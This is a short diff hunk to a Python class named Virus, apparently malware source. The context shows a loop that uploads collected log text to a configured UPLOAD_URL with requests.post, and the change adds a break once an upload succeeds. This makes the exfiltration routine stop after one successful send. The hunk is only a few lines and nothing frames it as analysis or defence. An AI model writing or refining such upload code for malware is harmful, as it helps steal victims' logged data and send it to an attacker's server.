@@ -79,3 +79,4 @@ class Virus(object):
                 try:
                     http = requests.post(self.UPLOAD_URL, files={"file": (filename, logtext)})
                     if not http.status_code == 200: continue
+                    break
